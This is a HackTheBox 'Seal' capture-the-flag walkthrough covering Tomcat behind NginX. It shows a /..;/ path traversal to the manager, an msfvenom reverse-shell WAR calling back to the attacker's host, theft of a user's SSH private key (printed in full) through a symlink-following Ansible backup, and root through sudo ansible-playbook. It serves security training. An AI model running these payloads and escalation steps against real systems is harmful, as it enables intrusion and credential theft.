# HackTheBox-Seal - Tomcat | LFI | Misconfiguration

<img width="1030" alt="Screen Shot 2021-11-13 at 22 24 17" src="https://user-images.githubusercontent.com/87259078/141670152-9f6be228-872c-498a-bcd4-a0fe739030e8.png">

# Synopsis

“Seal” is marked as medium difficulty machine that features NginX, TomCat and GitBucket. GitBucket has a source code of running web server and all the commits. One of the commit reveals the user credentials for TomCat manager, we upload our payload and get the reverse connection as service user. To escalate privileges to user we take advantage of a backup misconfiguration to get access to user SSH private keys. We escalate from user to root shell we take advantage of sudo capabilities given to user and gain root shell.

# Skills Required

- Web Enumeration
- Managing TomCat and NginX Portal
- Linux Enumeration

# Skills Learned

- Reverse Proxy Bypass

# Enumeration

```other
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.129.95.160
Nmap scan report for 10.129.95.160
Host is up (0.28s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-05T10:24:03
| Not valid after:  2022-05-05T10:24:03
| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
|_SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 401 Unauthorized
|     Date: Mon, 12 Jul 2021 05:07:17 GMT
|     Set-Cookie: JSESSIONID=node0cjueyj9mngsn1dbjlutp9abgn3.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest:
|     HTTP/1.1 401 Unauthorized
|     Date: Mon, 12 Jul 2021 05:07:15 GMT
|     Set-Cookie: JSESSIONID=node013f1cklii01aglp6b2ctsrzct1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Mon, 12 Jul 2021 05:07:16 GMT
|     Set-Cookie: JSESSIONID=node0y3d36gtypfwe14zhzw3daq08t2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck:
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest:
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4:
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5:
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

Nmap reveals three open ports, two of them are HTTP/S and one is SSH. We also got the hostname of machine from SSL certificate information, add it to hosts file.

![Screen Shot 2021-07-12 at 22.12.52.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/1B80C7F9-4008-4839-9458-4BA3C1AA0A75_2/Screen%20Shot%202021-07-12%20at%2022.12.52.png)

![Screen Shot 2021-07-12 at 22.15.06.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/AAC50B7C-5338-4F69-BA37-EC51FC0F2C58_2/Screen%20Shot%202021-07-12%20at%2022.15.06.png)

Port 8080 is running gitbucket application and port 443 is running a vegetable market. Create user on gitbucket and login.

![Screen Shot 2021-07-12 at 22.17.54.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/D80CD497-0B50-4006-B6EF-60824B28BD5C_2/Screen%20Shot%202021-07-12%20at%2022.17.54.png)

![Screen Shot 2021-07-12 at 22.19.17.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/3909E841-4612-49A9-B96A-80DF1EA8E86B_2/Screen%20Shot%202021-07-12%20at%2022.19.17.png)

There are two repository created by root user with multiple commits and issues. Check ‘seal_market’ repository, complete code is available of port 443 (seal market).

The ToDo gives us some hints about tomcat configuration files and tomcat manager is still enabled. Also, TomCat is running as backend server and NginX is running as frontend server to balance the load.

According to TomCat documentation, the /manger and /host-manager is installed by default. But if we access the those endpoints, we’d get 403 error.

[Apache Tomcat 7 (7.0.109) - Manager App HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)

![Screen Shot 2021-07-12 at 23.18.13.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/002ADB4F-1462-4CB7-AF86-D93F82DD0D6C_2/Screen%20Shot%202021-07-12%20at%2023.18.13.png)

According to the TomCat documentation, if we access /manager endpoint then it redirects to /manager/html. Perhaps this endpoint is not accessible to other IP’s. In the document they have also mentioned that to access /manager we need predefined credentials and the configuration of that is in this filename ‘tomcat-users.xml’. If we look into the repository, we find the file.

![Screen Shot 2021-07-13 at 01.44.45.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/DCF84128-B495-445A-BC72-875B2FBC1FD4_2/Screen%20Shot%202021-07-13%20at%2001.44.45.png)

![Screen Shot 2021-07-13 at 01.45.04.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/0E6D1593-9979-4720-837C-FD9BB0307B44_2/Screen%20Shot%202021-07-13%20at%2001.45.04.png)

The configuration file has no stored credentials, it’s blank. Let’s look into the history of this users file.

![Screen Shot 2021-07-13 at 02.31.16.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/F2235706-2D70-4A95-9CD5-CEF848F74702_2/Screen%20Shot%202021-07-13%20at%2002.31.16.png)

Check the latest commit, you will find deleted lines from the source.

![Screen Shot 2021-07-13 at 02.30.01.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/24D058DE-60D4-4010-AFED-6E2542B1B62F_2/Screen%20Shot%202021-07-13%20at%2002.30.01.png)

Line 44 deleted line gives us the credentials of TomCat manager. We still need to find the login portal to use these creds.

Let’s run directory brute-force to any directories.

```other
⛩\> gobuster dir -u https://seal.htb/manager/ -k -t 30 -b 404 -w ~/tools/SecLists/Discovery/Web-Content/tomcat.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://seal.htb/manager/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /home/kali/tools/SecLists/Discovery/Web-Content/tomcat.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/13 09:45:24 Starting gobuster in directory enumeration mode
===============================================================
/html/*               (Status: 403) [Size: 162]
/jmxproxy/*           (Status: 401) [Size: 2499]
/status/*             (Status: 401) [Size: 2499]
```

We got three possible directories, /html is giving 403 status code, so basically it is forbidden to access. The remaining two directories status code is 401, that is unauthorized. So, let’s try to access them.

![Screen Shot 2021-07-13 at 02.49.38.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/CB79DD3C-D01F-46E0-8535-9F66749043C5_2/Screen%20Shot%202021-07-13%20at%2002.49.38.png)

Input the creds and login.

![Screen Shot 2021-07-13 at 03.33.01.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/52BF4A63-065C-4227-B8D9-902949777074_2/Screen%20Shot%202021-07-13%20at%2003.33.01.png)

Tho the creds are valid the user/manager don’t have permission to access this /jmxproxy endpoint. TomCat version 7 onwards they have changed the roles of manager, now we need to explicitly mention in the ‘tomcat-user.xml’ file which roles this manager should have. If we look back into ‘tomcat-users.xml’ configuration file, we will find only one role.

![Screen Shot 2021-07-13 at 03.36.55.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/B5344014-9497-4ED2-A611-2990F962DDDE_2/Screen%20Shot%202021-07-13%20at%2003.36.55.png)

We have only two roles and none of them are ‘jmx’.

According to documentation, anyone of manager with assigned roles can able to access the /status endpoint.

![Screen Shot 2021-07-13 at 03.40.18.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/46D9B79D-E3D7-48B4-8AEA-C22EFEBD2F64_2/Screen%20Shot%202021-07-13%20at%2003.40.18.png)

[Apache Tomcat 7 (7.0.109) - Manager App HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Server_Status)

Let’s try these creds on it on /status endpoint.

![Screen Shot 2021-07-13 at 03.30.44.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/D6B1E65B-40A9-48BD-BCD6-5E87DE0C9FC0_2/Screen%20Shot%202021-07-13%20at%2003.30.44.png)

We have information on JVM (Java Virtual Machine) version and OS architecture.

# Initial Access

If a reverse proxy with java as backend service is running then there is this architecture problem and that is vulnerable by default. In our situation, we have a NginX (reverse proxy) and TomCat (Java backend) is running. Tomcat allows to perform really "weird" traversals like `/..;/..;/`. Tomcat will treat the sequence `/..;/` as `/../` and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is. This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping.

[A fresh look on reverse proxy related attacks | Acunetix](https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/)

> [https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

[Tomcat path traversal via reverse proxy mapping - Vulnerabilities - Acunetix](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)

Due to architectural problems we can able to traverse to another path to read the files. As per assigned roles to this current user, we are not allowed to access default /manager gui page. If we can able to access this GUI page then we can deploy applications and do much more things. Let’s try to access that page.

![Screen Shot 2021-07-13 at 23.43.44.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/13D2D3BD-166E-431D-BB32-1798ECFBA59A_2/Screen%20Shot%202021-07-13%20at%2023.43.44.png)

We successfully tricked the server to access the GUI page. As you can see we can upload WAR file. Let’s generate that with Metasploit.

```other
⛩\> msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.22 lport=1234 -f war -o rce.war
Payload size: 1101 bytes
Final size of war file: 1101 bytes
Saved as: rce.war
```

Now we need to upload this and intercept in burp suite. Remember, we don’t have direct access to this GUI, so we need to alter the POST request to traverse to the right path.

![Screen Shot 2021-07-13 at 23.49.29.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/08267282-932B-4203-9AC4-BDB16D55E841_2/Screen%20Shot%202021-07-13%20at%2023.49.29.png)

The above is default POST request. Now we need to modify the path and send forward the request to server.

![Screen Shot 2021-07-13 at 23.57.32.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8FB0D9E1-B1A3-4A9C-9E92-754FEA6A58EC/58A1B393-EAD5-43AE-9D4B-37262DA7FAC5_2/Screen%20Shot%202021-07-13%20at%2023.57.32.png)

The above is modified POST request. Check the selected part. Once you forward the request, go back to GUI dashboard and under application you can see /rce app.

Setup a listener using Netcat or Pwncat and click your uploaded application from the dashboard.

```other
⛩\> pwncat -l -p 1234
[07:00:32] received connection from 10.129.95.160:43422                                                  connect.py:255

[07:00:36] new host w/ hash 4c72943241c0000bb55e1f96e0f45c3b                                              victim.py:321
[07:00:49] pwncat running in /bin/sh                                                                      victim.py:354
[07:00:56] pwncat is ready 🐈                                                                             victim.py:771

\[\](remote)\[\] \[\]tomcat@seal\[\]:\[\]/\[\]$ bash

tomcat@seal:/$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

We got the reverse connection with Tomcat (service) privileges.

```other
tomcat@seal:/$ grep '/bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
luis:x:1000:1000:,,,:/home/luis:/bin/bash
```

We need to escalate our privileges to ‘luis’ user and then ‘root’.

# Privilege Escalation - User

```swift
tomcat@seal:/$ ps aux | grep luis

luis         949  0.0  0.0   2608   608 ?        Ss   06:04   0:00 /bin/sh -c java -jar /home/luis/gitbucket.war
luis         950  0.6  4.2 3608316 172636 ?      Sl   06:04   0:24 java -jar /home/luis/gitbucket.war
root       12699  0.0  0.0   2608   540 ?        Ss   07:05   0:00 /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
tomcat     12703  0.0  0.0   6300   736 pts/0    S+   07:05   0:00 grep luis
```

If we look into the running process with ‘luis’ privileges, the we’d find this cronjob running every 30 seconds by root user with ‘luis’ privileges and it is executing ‘ansible’ application with ‘yml’ file.

```yaml
tomcat@seal:/$ cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

It is copying files from specific source and destination including linked files/directory. Along with that it is archiving copied files/directory into different directory and then it is removing the initial copied files.

```other
tomcat@seal:/$ ls -la /opt/backups/playbook/run.yml
-rw-rw-r-- 1 luis luis 403 May  7 07:14 /opt/backups/playbook/run.yml
```

We don’t have permission to edit/modify the ‘yml’ file.

```shell
tomcat@seal:/$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard/
total 100
drwxr-xr-x 7 root root  4096 May  7 09:26 .
drwxr-xr-x 3 root root  4096 May  6 10:48 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6 10:42 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 May  7 09:26 uploads
```

We have full permission for ‘upload’ directory - which is inside dashboard. As the ‘yml’ configuration says, it is copying even linked files/directory so we link ‘luis’ SSH keys, and when it gets copied and archived we can able to retrieve those keys.

```other
tomcat@seal:/$ ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/

tomcat@seal:/$ cd /opt/backups/archives/

tomcat@seal:/opt/backups/archives$ ls
backup-2021-07-14-07:25:32.gz

tomcat@seal:/opt/backups/archives$ date
Wed 14 Jul 2021 07:26:10 AM UTC

tomcat@seal:/opt/backups/archives$ ls
backup-2021-07-14-07:25:32.gz  backup-2021-07-14-07:26:32.gz

tomcat@seal:/opt/backups/archives$ cp backup-2021-07-14-07\:26\:32.gz /tmp/backup.gz
```

We need to link the SSH directory to uploads, then we check the archived file and copy it to /tmp location with different name.

Now we need to extract the file, switch to /tmp directory.

```other
tomcat@seal:/tmp$ gzip -d backup.gz

tomcat@seal:/tmp$ file backup
backup: POSIX tar archive

tomcat@seal:/tmp$ tar -xf backup
```

We extracted the compressed file, now retrieve SSH private keys.

```shell
tomcat@seal:/tmp$ cat dashboard/uploads/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
```

Copy the key to Kali Linux, give the right permissions to file and login into ‘luis’ user via SSH.

```other
⛩\> chmod 600 id_rsa

⛩\> ssh -i id_rsa luis@seal.htb

luis@seal:~$ id
uid=1000(luis) gid=1000(luis) groups=1000(luis)

luis@seal:~$ cat user.txt
3c626867f125dc8a444498e96ac95f4b
```

We got the access to luis shell and read the user flag.

# Privilege Escalation - Root

```other
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

We have permission to execute a binary with root privileges. Let’s create a custom ‘yml’ file to enable SUID bit on bash binary.

```other
luis@seal:~$ cat test.yml
- hosts: localhost
  tasks:
  - name: change perms
    command: chmod +s /bin/bash
```

Now we need to execute the binary and provide this ‘yml’ file.

```swift
luis@seal:~$ sudo ansible-playbook test.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match
'all'

PLAY [localhost] ******************************************************************************************************

TASK [Gathering Facts] ************************************************************************************************
ok: [localhost]

TASK [change perms] ***************************************************************************************************
[WARNING]: Consider using the file module with mode rather than running 'chmod'.  If you need to use command because
file is insufficient you can add 'warn: false' to this command task or set 'command_warnings=False' in ansible.cfg to
get rid of this message.
changed: [localhost]

PLAY RECAP ************************************************************************************************************
localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
```

It executed successfully without any errors. Let’s access the bash binary.

```other
luis@seal:~$ bash -p
bash-5.0# id
uid=1000(luis) gid=1000(luis) euid=0(root) egid=0(root) groups=0(root),1000(luis)

bash-5.0# cat /root/root.txt
5440c2e9f4914a0d0d5bc39db55e8cd3
```

Another way is to use GTFO Bins.

```other
luis@seal:~$ TF=$(mktemp)
luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
luis@seal:~$ sudo ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] **********************************************************************************************************************************************

TASK [Gathering Facts] ****************************************************************************************************************************************
ok: [localhost]

TASK [shell] **************************************************************************************************************************************************
# id
uid=0(root) gid=0(root) groups=0(root)
# cat root.txt
cat: root.txt: No such file or directory
# cat /root/root.txt
dd45a2074a47e6dbe62556a152b0b274
```

We got the root flag.

